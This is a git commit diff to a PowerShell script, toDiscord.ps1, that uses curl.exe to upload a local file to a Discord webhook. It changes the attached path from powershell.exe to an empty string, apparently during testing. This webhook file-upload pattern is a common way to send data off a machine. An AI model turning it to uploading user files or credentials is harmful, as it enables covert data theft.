43bbc6f2956c0c55c4de139a43f1bc3e9eb0eddf
SolidPiku <85856662+SolidPiku@users.noreply.github.com>
2024-11-05 11:00:23 -0600

    Update toDiscord.ps1

--- toDiscord.ps1
+++ toDiscord.ps1
@@ -4,4 +4,4 @@ $wh = "https://discord.com/api/webhooks/$wh"
 
 Write-Output "test output"
 
-curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe`"" $wh
+curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"`"" $wh
